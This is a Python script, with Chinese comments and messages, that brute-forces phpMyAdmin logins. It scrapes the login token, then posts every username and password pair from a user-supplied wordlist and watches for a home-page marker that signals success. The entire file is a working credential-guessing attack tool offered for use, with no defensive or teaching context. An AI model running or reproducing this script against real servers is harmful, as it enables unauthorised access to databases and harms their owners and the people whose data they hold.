# @Author：只因不值得
import requests,re,threading
from colorama import Fore

class Crack(threading.Thread):
    def __init__(self,url,user):
        threading.Thread.__init__(self)
        self.url = url
        self.user = user

    # 获取token
    def Get_Token(self):
        req = requests.get(self.url)
        if req.status_code == 200:
            token = re.search("name=\"token\" value=\"(.*?)\"",req.text).group(1)
            return token
        else:
            print(Fore.RED + "[-]" + Fore.WHITE + " 访问网站失败,响应码为: {0}".format(req.status_code))
            exit(0)

    def run(self):
        header = {
            "User-Agent": "Mozilla / 5.0(Windows NT 10.0;WOW64;rv: 52.0) Gecko / 20100101Firefox / 52.0"
        }
        session = requests.session()
        token = self.Get_Token()
        for user in self.user:
            for pwd in self.user:
                data = {
                    "pma_username": user,  # 用户
                    "pma_password": pwd,  # 密码
                    "server": "1",
                    "lang": "zh_CN",
                    "token": token  # token
                }
                print(Fore.RED + "[*] " + Fore.WHITE + "正在进行破解：{0}   |   {1}".format(user, pwd))
                r = session.post(self.url,data=data,headers=header)
                phpmyadmin = session.get(self.url + 'navigation.php?token=' + token,headers=header)
                # print(phpmyadmin.text)
                if "主页" in phpmyadmin.text:
                    print(Fore.GREEN + "[+] " + "{0} {1}".format(user, pwd))
                    exit(0)
        print(Fore.RED + "[-] " + Fore.WHITE + "爆破失败，请换个字典")

if __name__ == "__main__":
    filename = input(Fore.RED + "Filename > " + Fore.GREEN)
    Url = input(Fore.RED + "Url > " + Fore.GREEN)
    user = []
    for username in open(filename,"r"):
        user.append(username.strip("\n"))
    print(Fore.GREEN + "[+] 开始暴力破解phpmyadmin" + Fore.WHITE)
    # "http://127.0.0.1/phpmyadmin/"
    t = Crack(Url+"/",user)
    t.start()
